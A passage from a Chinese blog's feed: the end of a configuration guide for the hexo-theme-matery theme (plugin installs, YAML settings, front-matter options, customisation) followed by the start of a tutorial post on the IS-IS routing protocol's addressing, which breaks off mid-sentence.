<a href="https://github.com/willin/hexo-wordcount">hexo-wordcount</a>插件。</p><p>安装命令如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> i --save hexo-wordcount<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后只需在本主题下的 <code>_config.yml</code> 文件中，将各个文章字数相关的配置激活即可：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">postInfo</span><span class="token punctuation">:</span>  <span class="token key atrule">date</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>  <span class="token key atrule">update</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>  <span class="token key atrule">wordCount</span><span class="token punctuation">:</span> <span class="token boolean important">false</span> <span class="token comment"># 设置文章字数统计为 true.</span>  <span class="token key atrule">totalCount</span><span class="token punctuation">:</span> <span class="token boolean important">false</span> <span class="token comment"># 设置站点文章总字数统计为 true.</span>  <span class="token key atrule">min2read</span><span class="token punctuation">:</span> <span class="token boolean important">false</span> <span class="token comment"># 阅读时长.</span>  <span class="token key atrule">readCount</span><span class="token punctuation">:</span> <span class="token boolean important">false</span> <span class="token comment"># 阅读次数.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="添加emoji表情支持（可选的）"><a href="#添加emoji表情支持（可选的）" class="headerlink" title="添加emoji表情支持（可选的）"></a>添加emoji表情支持（可选的）</h3><p>本主题新增了对<code>emoji</code>表情的支持，使用到了 <a href="https://npm.taobao.org/package/hexo-filter-github-emojis">hexo-filter-github-emojis</a> 的 Hexo 插件来支持 <code>emoji</code>表情的生成，把对应的<code>markdown emoji</code>语法（<code>::</code>,例如：<code>:smile:</code>）转变成会跳跃的<code>emoji</code>表情，安装命令如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-filter-github-emojis --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 Hexo 根目录下的 <code>_config.yml</code> 文件中，新增以下的配置项：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">githubEmojis</span><span class="token punctuation">:</span>  <span class="token key atrule">enable</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>  <span class="token key atrule">className</span><span class="token punctuation">:</span> github<span class="token punctuation">-</span>emoji  <span class="token key atrule">inject</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>  <span class="token key atrule">styles</span><span class="token punctuation">:</span>  customEmojis<span class="token punctuation">:</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行 <code>hexo clean &amp;&amp; hexo g</code> 重新生成博客文件，然后就可以在文章中对应位置看到你用<code>emoji</code>语法写的表情了。</p><h3 id="添加-RSS-订阅支持（可选的）"><a href="#添加-RSS-订阅支持（可选的）" class="headerlink" title="添加 RSS 订阅支持（可选的）"></a>添加 RSS 订阅支持（可选的）</h3><p>本主题中还使用到了 <a href="https://github.com/hexojs/hexo-generator-feed">hexo-generator-feed</a> 的 Hexo 插件来做 <code>RSS</code>，安装命令如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-generator-feed --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 Hexo 根目录下的 <code>_config.yml</code> 文件中，新增以下的配置项：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">feed</span><span class="token punctuation">:</span>  <span class="token key atrule">type</span><span class="token punctuation">:</span> atom  <span class="token key atrule">path</span><span class="token punctuation">:</span> atom.xml  <span class="token key atrule">limit</span><span class="token punctuation">:</span> <span class="token number">20</span>  <span class="token key atrule">hub</span><span class="token punctuation">:</span>  <span class="token key atrule">content</span><span class="token punctuation">:</span>  <span class="token key atrule">content_limit</span><span class="token punctuation">:</span> <span class="token number">140</span>  <span class="token key atrule">content_limit_delim</span><span class="token punctuation">:</span> <span class="token string">' '</span>  <span class="token key atrule">order_by</span><span class="token punctuation">:</span> <span class="token punctuation">-</span>date<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行 <code>hexo clean &amp;&amp; hexo g</code> 重新生成博客文件，然后在 <code>public</code> 文件夹中即可看到 <code>atom.xml</code> 文件，说明你已经安装成功了。</p><h3 id="添加-DaoVoice-在线聊天功能（可选的）"><a href="#添加-DaoVoice-在线聊天功能（可选的）" class="headerlink" title="添加 DaoVoice 在线聊天功能（可选的）"></a>添加 <a href="http://www.daovoice.io/">DaoVoice</a> 在线聊天功能（可选的）</h3><p>前往 <a href="http://www.daovoice.io/">DaoVoice</a> 官网注册并且获取 <code>app_id</code>，并将 <code>app_id</code> 填入主题的 <code>_config.yml</code> 文件中。</p><h3 id="添加-Tidio-在线聊天功能（可选的）"><a href="#添加-Tidio-在线聊天功能（可选的）" class="headerlink" title="添加 Tidio 在线聊天功能（可选的）"></a>添加 <a href="https://www.tidio.com/">Tidio</a> 在线聊天功能（可选的）</h3><p>前往 <a href="https://www.tidio.com/">Tidio</a> 官网注册并且获取 <code>Public Key</code>，并将 <code>Public Key</code> 填入主题的 <code>_config.yml</code> 文件中。</p><h3 id="修改页脚"><a href="#修改页脚" class="headerlink" title="修改页脚"></a>修改页脚</h3><p>页脚信息可能需要做定制化修改，而且它不便于做成配置信息，所以可能需要你自己去再修改和加工。修改的地方在主题文件的 <code>/layout/_partial/footer.ejs</code> 文件中，包括站点、使用的主题、访问量等。</p><h3 id="修改社交链接"><a href="#修改社交链接" class="headerlink" title="修改社交链接"></a>修改社交链接</h3><p>在主题的 <code>_config.yml</code> 文件中，默认支持 <code>QQ</code>、<code>GitHub</code> 和邮箱等的配置，你可以在主题文件的 <code>/layout/_partial/social-link.ejs</code> 文件中，新增、修改你需要的社交链接地址，增加链接可参考如下代码：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html">&lt;% if (theme.socialLink.github) &#123; %>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;%= theme.socialLink.github %><span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tooltipped<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span> <span class="token attr-name">data-tooltip</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>访问我的GitHub<span class="token punctuation">"</span></span> <span class="token attr-name">data-position</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>top<span class="token punctuation">"</span></span> <span class="token attr-name">data-delay</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>fab fa-github<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>&lt;% &#125; %><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中，社交图标（如：<code>fa-github</code>）你可以在 <a href="https://fontawesome.com/icons">Font Awesome</a> 中搜索找到。以下是常用社交图标的标识，供你参考：</p><ul><li>Facebook: <code>fab fa-facebook</code></li><li>Twitter: <code>fab fa-twitter</code></li><li>Google-plus: <code>fab fa-google-plus</code></li><li>Linkedin: <code>fab fa-linkedin</code></li><li>Tumblr: <code>fab fa-tumblr</code></li><li>Medium: <code>fab fa-medium</code></li><li>Slack: <code>fab fa-slack</code></li><li>Sina Weibo: <code>fab fa-weibo</code></li><li>Wechat: <code>fab fa-weixin</code></li><li>QQ: <code>fab fa-qq</code></li><li>Zhihu: <code>fab fa-zhihu</code></li></ul><blockquote><p><strong>注意</strong>: 本主题中使用的 <code>Font Awesome</code> 版本为 <code>5.11.0</code>。</p></blockquote><h3 id="修改打赏的二维码图片"><a href="#修改打赏的二维码图片" class="headerlink" title="修改打赏的二维码图片"></a>修改打赏的二维码图片</h3><p>在主题文件的 <code>source/medias/reward</code> 文件中，你可以替换成你的的微信和支付宝的打赏二维码图片。</p><h3 id="配置音乐播放器（可选的）"><a href="#配置音乐播放器（可选的）" class="headerlink" title="配置音乐播放器（可选的）"></a>配置音乐播放器（可选的）</h3><p>要支持音乐播放，在主题的 <code>_config.yml</code> 配置文件中激活music配置即可：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token comment"># 是否在首页显示音乐</span><span class="token key atrule">music</span><span class="token punctuation">:</span>  <span class="token key atrule">enable</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>  <span class="token key atrule">title</span><span class="token punctuation">:</span>         <span class="token comment"># 非吸底模式有效</span>    <span class="token key atrule">enable</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>    <span class="token key atrule">show</span><span class="token punctuation">:</span> 听听音乐  <span class="token key atrule">server</span><span class="token punctuation">:</span> netease   <span class="token comment"># require music platform: netease, tencent, kugou, xiami, baidu</span>  <span class="token key atrule">type</span><span class="token punctuation">:</span> playlist    <span class="token comment"># require song, playlist, album, search, artist</span>  <span class="token key atrule">id</span><span class="token punctuation">:</span> <span class="token number">503838841</span>     <span class="token comment"># require song id / playlist id / album id / search keyword</span>  <span class="token key atrule">fixed</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>      <span class="token comment"># 开启吸底模式</span>  <span class="token key atrule">autoplay</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>   <span class="token comment"># 是否自动播放</span>  <span class="token key atrule">theme</span><span class="token punctuation">:</span> <span class="token string">'#42b983'</span>  <span class="token key atrule">loop</span><span class="token punctuation">:</span> <span class="token string">'all'</span>       <span class="token comment"># 音频循环播放, 可选值: 'all', 'one', 'none'</span>  <span class="token key atrule">order</span><span class="token punctuation">:</span> <span class="token string">'random'</span>   <span class="token comment"># 音频循环顺序, 可选值: 'list', 'random'</span>  <span class="token key atrule">preload</span><span class="token punctuation">:</span> <span class="token string">'auto'</span>   <span class="token comment"># 预加载，可选值: 'none', 'metadata', 'auto'</span>  <span class="token key atrule">volume</span><span class="token punctuation">:</span> <span class="token number">0.7</span>       <span class="token comment"># 默认音量，请注意播放器会记忆用户设置，用户手动设置音量后默认音量即失效</span>  <span class="token key atrule">listFolded</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>  <span class="token comment"># 列表默认折叠</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><code>server</code>可选<code>netease</code>（网易云音乐），<code>tencent</code>（QQ音乐），<code>kugou</code>（酷狗音乐），<code>xiami</code>（虾米音乐），</p><p><code>baidu</code>（百度音乐）。</p><p><code>type</code>可选<code>song</code>（歌曲），<code>playlist</code>（歌单），<code>album</code>（专辑），<code>search</code>（搜索关键字），<code>artist</code>（歌手）</p><p><code>id</code>获取方法示例: 浏览器打开网易云音乐，点击我喜欢的音乐歌单，浏览器地址栏后面会有一串数字，<code>playlist</code>的<code>id</code></p><p>即为这串数字。</p></blockquote><h3 id="添加note"><a href="#添加note" class="headerlink" title="添加note"></a>添加note</h3><blockquote><p><a href="https://blog.17lai.site/posts/cf0f47fd/#tag-note">演示</a></p></blockquote><h4 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h4><pre class="line-numbers language-none"><code class="language-none">&#123;% note [class] [no-icon] [summary] %&#125;Any content (support inline tags too).&#123;% endnote %&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li><code>[class]</code> : <em>Optional parameter.</em> Supported values: default | primary | success | info | warning | danger.</li><li><code>[no-icon]</code> : <em>Optional parameter.</em> Disable icon in note.</li><li><code>[summary]</code> : <em>Optional parameter.</em> Optional summary of the note.</li></ul><p>All parameters are optional.</p><h4 id="example"><a href="#example" class="headerlink" title="example"></a>example</h4><pre class="line-numbers language-none"><code class="language-none">&#123;% note %&#125;#### Header(without define class style)&#123;% endnote %&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="添加button"><a href="#添加button" class="headerlink" title="添加button"></a>添加button</h3><blockquote><p><a href="https://blog.17lai.site/posts/cf0f47fd/#tag-button">演示</a></p></blockquote><h4 id="Usage-1"><a href="#Usage-1" class="headerlink" title="Usage"></a>Usage</h4><pre class="line-numbers language-none"><code class="language-none">&#123;% button url, text, icon [class], [title] %&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>or</p><pre class="line-numbers language-none"><code class="language-none">&#123;% btn url, text, icon [class], [title] %&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>url</code> : Absolute or relative path to URL.</li><li><code>text</code> : Button text. Required if no icon specified.</li><li><code>icon</code> : Font Awesome icon name. Required if no text specified.</li><li><code>[class]</code> : <em>Optional parameter.</em> Font Awesome class(es): <code>fa-fw</code> | <code>fa-lg</code> | <code>fa-2x</code> | <code>fa-3x</code> | <code>fa-4x</code> | <code>fa-5x</code></li><li><code>[title]</code> : <em>Optional parameter.</em> Tooltip at mouseover.</li></ul><h4 id="Examples"><a href="#Examples" class="headerlink" title="Examples"></a>Examples</h4><pre class="line-numbers language-none"><code class="language-none">&#123;% button #, Text %&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="文章-Front-matter-介绍"><a href="#文章-Front-matter-介绍" class="headerlink" title="文章 Front-matter 介绍"></a>文章 Front-matter 介绍</h2><h3 id="Front-matter-选项详解"><a href="#Front-matter-选项详解" class="headerlink" title="Front-matter 选项详解"></a>Front-matter 选项详解</h3><p><code>Front-matter</code> 选项中的所有内容均为<strong>非必填</strong>的。但我仍然建议至少填写 <code>title</code> 和 <code>date</code> 的值。</p><table><thead><tr><th>配置选项</th><th>默认值</th><th>描述</th></tr></thead><tbody><tr><td>title</td><td><code>Markdown</code> 的文件标题</td><td>文章标题，强烈建议填写此选项</td></tr><tr><td>date</td><td>文件创建时的日期时间</td><td>发布时间，强烈建议填写此选项，且最好保证全局唯一</td></tr><tr><td>author</td><td>根 <code>_config.yml</code> 中的 <code>author</code></td><td>文章作者</td></tr><tr><td>img</td><td><code>featureImages</code> 中的某个值</td><td>文章特征图，推荐使用图床(腾讯云、七牛云、又拍云等)来做图片的路径.如: <code>http://xxx.com/xxx.jpg</code></td></tr><tr><td>top</td><td><code>true</code></td><td>推荐文章（文章是否置顶），如果 <code>top</code> 值为 <code>true</code>，则会作为首页推荐文章</td></tr><tr><td>hide</td><td><code>false</code></td><td>隐藏文章，如果<code>hide</code>值为<code>true</code>，则文章不会在首页显示</td></tr><tr><td>cover</td><td><code>false</code></td><td><code>v1.0.2</code>版本新增，表示该文章是否需要加入到首页轮播封面中</td></tr><tr><td>coverImg</td><td>无</td><td><code>v1.0.2</code>版本新增，表示该文章在首页轮播封面需要显示的图片路径，如果没有，则默认使用文章的特色图片</td></tr><tr><td>password</td><td>无</td><td>文章阅读密码，如果要对文章设置阅读验证密码的话，就可以设置 <code>password</code> 的值，该值必须是用 <code>SHA256</code> 加密后的密码，防止被他人识破。前提是在主题的 <code>config.yml</code> 中激活了 <code>verifyPassword</code> 选项</td></tr><tr><td>toc</td><td><code>true</code></td><td>是否开启 TOC，可以针对某篇文章单独关闭 TOC 的功能。前提是在主题的 <code>config.yml</code> 中激活了 <code>toc</code> 选项</td></tr><tr><td>mathjax</td><td><code>false</code></td><td>是否开启数学公式支持 ，本文章是否开启 <code>mathjax</code>，且需要在主题的 <code>_config.yml</code> 文件中也需要开启才行</td></tr><tr><td>summary</td><td>无</td><td>文章摘要，自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要</td></tr><tr><td>categories</td><td>无</td><td>文章分类，本主题的分类表示宏观上大的分类，只建议一篇文章一个分类</td></tr><tr><td>tags</td><td>无</td><td>文章标签，一篇文章可以多个标签</td></tr><tr><td>keywords</td><td>文章标题</td><td>文章关键字，SEO 时需要</td></tr><tr><td>reprintPolicy</td><td>cc_by</td><td>文章转载规则， 可以是 cc_by, cc_by_nd, cc_by_sa, cc_by_nc, cc_by_nc_nd, cc_by_nc_sa, cc0, noreprint 或 pay 中的一个</td></tr></tbody></table><blockquote><p><strong>注意</strong>:</p><ol><li>如果 <code>img</code> 属性不填写的话，文章特色图会根据文章标题的 <code>hashcode</code> 的值取余，然后选取主题中对应的特色图片，从而达到让所有文章的特色图<strong>各有特色</strong>。</li><li><code>date</code> 的值尽量保证每篇文章是唯一的，因为本主题中 <code>Gitalk</code> 和 <code>Gitment</code> 识别 <code>id</code> 是通过 <code>date</code> 的值来作为唯一标识的。</li><li>如果要对文章设置阅读验证密码的功能，不仅要在 Front-matter 中设置采用了 SHA256 加密的 password 的值，还需要在主题的 <code>_config.yml</code> 中激活了配置。有些在线的 SHA256 加密的地址，可供你使用：<a href="http://tool.oschina.net/encrypt?type=2">开源中国在线工具</a>、<a href="http://encode.chahuo.com/">chahuo</a>、<a href="http://tool.chinaz.com/tools/hash.aspx">站长工具</a>。</li><li>您可以在文章md文件的 front-matter 中指定 reprintPolicy 来给单个文章配置转载规则</li></ol></blockquote><p>以下为文章的 <code>Front-matter</code> 示例。</p><h3 id="最简示例"><a href="#最简示例" class="headerlink" title="最简示例"></a>最简示例</h3><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token punctuation">---</span><span class="token key atrule">title</span><span class="token punctuation">:</span> typora<span class="token punctuation">-</span>vue<span class="token punctuation">-</span>theme主题介绍<span class="token key atrule">date</span><span class="token punctuation">:</span> <span class="token datetime number">2018-09-07 09:25:00</span><span class="token punctuation">---</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="最全示例"><a href="#最全示例" class="headerlink" title="最全示例"></a>最全示例</h3><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token punctuation">---</span><span class="token key atrule">title</span><span class="token punctuation">:</span> typora<span class="token punctuation">-</span>vue<span class="token punctuation">-</span>theme主题介绍<span class="token key atrule">date</span><span class="token punctuation">:</span> <span class="token datetime number">2018-09-07 09:25:00</span><span class="token key atrule">author</span><span class="token punctuation">:</span> 赵奇<span class="token key atrule">img</span><span class="token punctuation">:</span> /source/images/xxx.jpg<span class="token key atrule">top</span><span class="token punctuation">:</span> <span class="token boolean important">true</span><span class="token key atrule">hide</span><span class="token punctuation">:</span> <span class="token boolean important">false</span><span class="token key atrule">cover</span><span class="token punctuation">:</span> <span class="token boolean important">true</span><span class="token key atrule">coverImg</span><span class="token punctuation">:</span> /images/1.jpg<span class="token key atrule">password</span><span class="token punctuation">:</span> 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92<span class="token key atrule">toc</span><span class="token punctuation">:</span> <span class="token boolean important">false</span><span class="token key atrule">mathjax</span><span class="token punctuation">:</span> <span class="token boolean important">false</span><span class="token key atrule">summary</span><span class="token punctuation">:</span> 这是你自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要<span class="token key atrule">categories</span><span class="token punctuation">:</span> Markdown<span class="token key atrule">tags</span><span class="token punctuation">:</span>  <span class="token punctuation">-</span> Typora  <span class="token punctuation">-</span> Markdown<span class="token punctuation">---</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="效果截图"><a href="#效果截图" class="headerlink" title="效果截图"></a>效果截图</h2><p><img src="http://static.blinkfox.com/matery-20181202-1.png" alt="首页"></p><p><img src="http://static.blinkfox.com/matery-20181202-2.png" alt="首页推荐文章"></p><p><img src="http://static.blinkfox.com/matery-20181202-3.png" alt="首页文章列表"></p><p><img src="http://static.blinkfox.com/matery-20181202-7.png" alt="首页文章列表"></p><p><img src="http://static.blinkfox.com/matery-20181202-8.png" alt="首页文章列表"></p><h2 id="自定制修改"><a href="#自定制修改" class="headerlink" title="自定制修改"></a>自定制修改</h2><p>在本主题的 <code>_config.yml</code> 中可以修改部分自定义信息，有以下几个部分：</p><ul><li>菜单</li><li>我的梦想</li><li>首页的音乐播放器和视频播放器配置</li><li>是否显示推荐文章名称和按钮配置</li><li><code>favicon</code> 和 <code>Logo</code></li><li>个人信息</li><li>TOC 目录</li><li>文章打赏信息</li><li>复制文章内容时追加版权信息</li><li>MathJax</li><li>文章字数统计、阅读时长</li><li>点击页面的’爱心’效果</li><li>我的项目</li><li>我的技能</li><li>我的相册</li><li><code>Gitalk</code>、<code>Gitment</code>、<code>Valine</code> 和 <code>disqus</code> 评论配置</li><li><a href="http://busuanzi.ibruce.info/">不蒜子统计</a>和谷歌分析（<code>Google Analytics</code>）</li><li>默认特色图的集合。当文章没有设置特色图时，本主题会根据文章标题的 <code>hashcode</code> 值取余，来选择展示对应的特色图</li></ul><p><strong>我认为个人博客应该都有自己的风格和特色</strong>。如果本主题中的诸多功能和主题色彩你不满意，可以在主题中自定义修改，很多更自由的功能和细节点的修改难以在主题的 <code>_config.yml</code> 中完成，需要修改源代码才来完成。以下列出了可能对你有用的地方：</p><h3 id="修改主题颜色"><a href="#修改主题颜色" class="headerlink" title="修改主题颜色"></a>修改主题颜色</h3><p>在主题文件的 <code>/source/css/matery.css</code> 文件中，搜索 <code>.bg-color</code> 来修改背景颜色：</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token comment">/* 整体背景颜色，包括导航、移动端的导航、页尾、标签页等的背景颜色. */</span><span class="token selector">.bg-color</span> <span class="token punctuation">&#123;</span>    <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token function">linear-gradient</span><span class="token punctuation">(</span>to right<span class="token punctuation">,</span> #4cbf30 0%<span class="token punctuation">,</span> #0f9d58 100%<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token atrule"><span class="token rule">@-webkit-keyframes</span> rainbow</span> <span class="token punctuation">&#123;</span>   <span class="token comment">/* 动态切换背景颜色. */</span><span class="token punctuation">&#125;</span><span class="token atrule"><span class="token rule">@keyframes</span> rainbow</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/* 动态切换背景颜色. */</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="修改-banner-图和文章特色图"><a href="#修改-banner-图和文章特色图" class="headerlink" title="修改 banner 图和文章特色图"></a>修改 banner 图和文章特色图</h3><p>你可以直接在 <code>/source/medias/banner</code> 文件夹中更换你喜欢的 <code>banner</code> 图片，主题代码中是每天动态切换一张，只需 <code>7</code> 张即可。如果你会 <code>JavaScript</code> 代码，可以修改成你自己喜欢切换逻辑，如：随机切换等，<code>banner</code> 切换的代码位置在 <code>/layout/_partial/bg-cover-content.ejs</code> 文件的 <code>&lt;script&gt;&lt;/script&gt;</code> 代码中：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.bg-cover'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token string">'background-image'</span><span class="token punctuation">,</span> <span class="token string">'url(/medias/banner/'</span> <span class="token operator">+</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDay</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.jpg)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 <code>/source/medias/featureimages</code> 文件夹中默认有 24 张特色图片，你可以再增加或者减少，并需要在 <code>_config.yml</code> 做同步修改。</p><h2 id="版本变更记录"><a href="#版本变更记录" class="headerlink" title="版本变更记录"></a>版本变更记录</h2><p>参见 <a href="https://github.com/blinkfox/hexo-theme-matery/blob/master/CHANGELOG.md">CHANGELOG.md</a></p><h2 id="更多部署方式"><a href="#更多部署方式" class="headerlink" title="更多部署方式"></a>更多部署方式</h2><blockquote><p>Jsdelivr 已经被封了，这两个可以加速访问快一点</p></blockquote><h3 id="vercel-部署"><a href="#vercel-部署" class="headerlink" title="vercel 部署"></a><a href="https://blog.17lai.site/posts/5311b619/#vercel-%E9%83%A8%E7%BD%B2">vercel 部署</a></h3><h3 id="cloudflare-Pages-部署"><a href="#cloudflare-Pages-部署" class="headerlink" title="cloudflare Pages 部署"></a><a href="https://blog.17lai.site/posts/5311b619/#cloudflare-Pages-%E9%83%A8%E7%BD%B2">cloudflare Pages 部署</a></h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;center&gt;hexo-theme-matery&lt;/center&gt;&lt;/h1&gt;

&lt;p&gt;&lt;a href=&quot;http://hits.dwyl.io/blinkfox/hexo-theme-matery&quot;&gt;&lt;img src=&quot;http://hits.dwyl.io/blink</summary>
      
    
    
    
    <category term="个人" scheme="https://shierjinghuang.github.io/categories/%E4%B8%AA%E4%BA%BA/"/>
    
    
    <category term="Hexo" scheme="https://shierjinghuang.github.io/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>链路状态路由协议IS-IS</title>
    <link href="https://shierjinghuang.github.io/2023/03/26/%E9%93%BE%E8%B7%AF%E7%8A%B6%E6%80%81%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AEIS-IS/"/>
    <id>https://shierjinghuang.github.io/2023/03/26/%E9%93%BE%E8%B7%AF%E7%8A%B6%E6%80%81%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AEIS-IS/</id>
    <published>2023-03-26T06:58:35.000Z</published>
    <updated>2023-04-09T07:11:23.319Z</updated>
    
    <content type="html"><![CDATA[<center><h1>中间系统到中间系统 IS-IS</h1></center>[TOC]<blockquote><p><font color="blue">IS-IS是ISO为CLNP[<font color="black">ConnectionLessNetwork Protocol，无连接网络协议]</font>设计的一种动态路由协议</font></p></blockquote><p>随着TCP/IP协议的流行，为了提供对IP路由的支持，IETF在RFC1195中对IS-IS进行了扩充和修改，使它能够同时应用在TCP/IP和OSI环境中，我们将扩展后的IS-IS称为<strong>集成IS-IS</strong></p><h2 id="IS-IS的基本概念"><a href="#IS-IS的基本概念" class="headerlink" title="IS-IS的基本概念"></a>IS-IS的基本概念</h2><p>IS-IS概述：IS-IS是一种<font color="red">链路状态路由协议</font>，是ISO定义的OSI协议栈中的CLNS是ConnectionLess Network Service，无连接网络服务的一部分</p><ul><li><p>CLNS (CLNS也是一种无连接的网络) 由以下三个部分组成</p><ul><li><p>CLNP：类似于TCP/IP中的IP协议。</p></li><li><p>IS-IS：类似于TCP/IP中的OSPF</p></li><li><p>ES-IS：类似于TCP/IP中的ARP，ICMP等</p></li></ul></li><li><p>ES：End System，终端系统，类似于IP网络环境中的主机</p></li><li><p>ES-IS：End System to Intermediate System，终端系统到中间系统</p></li></ul><h3 id="IS-IS地址结构"><a href="#IS-IS地址结构" class="headerlink" title="IS-IS地址结构"></a>IS-IS地址结构</h3><h5 id="NSAP："><a href="#NSAP：" class="headerlink" title="NSAP："></a>NSAP：</h5><blockquote><p><font color="blue">NSAP Network Service Access Point，网络服务访问点</font>，是OSI协议栈中用于定位资源的地址，主要用于提供网络层和上层应用之间的接口</p></blockquote><ul><li>NSAP包括IDP（Initial Domian Part）及DSP（Domian Specific Part）如下图所示：</li></ul><img src="https://shierjinghuang.github.io/2023/03/26/链路状态路由协议IS-IS/IS-IS地址结构.png" style="zoom:80%;" /><center>IS-IS地址结构</center>- IDP，由AFI(Authority and Format Identifier)与IDI(Initial Domain Identifier)两部分组成，AFI表示地址分配机构和地址格式，IDI用来标识域- DSP相当于IP地址中的子网号和主机地址。由High Order DSP、System ID和SEL三个部分组成，High Order DSP用来分割区域，System ID用来区分主机，SEL（NSAP Selector）用来指示服务类型<h5 id="NET："><a href="#NET：" class="headerlink" title="NET："></a>NET：</h5><blockquote><p><font color="blue">NET 网络实体名称：是OSI协议栈中设备的网络层信息，主要用于路由计算</font>，由区域地址Area ID和System ID组成，可以看作是特殊的NSAP</p></blockquote><ul><li><p>NET的长度与NSAP的相同，最长为20Byte，最短为8Byte</p></li><li><p>在IP网络中运行IS-IS时，只需配置NET，根据NET地址设备可以获取到Area ID以及System ID。</p></li><li><p><font color="blue">Area ID被称为区域地址</font>，由IDP和DSP中的High Order DSP组成，能标识路由域，也标识路由域中的区域</p><ul><li>一般情况下，一个路由器只需要配置一个区域地址，且同一区域中所有节点的区域地址都要相同。为了支持区域的平滑合并、分割及转换，缺省情况下，一个IS-IS进程下最多可配置3个区域地址。</li></ul></li><li><p>System 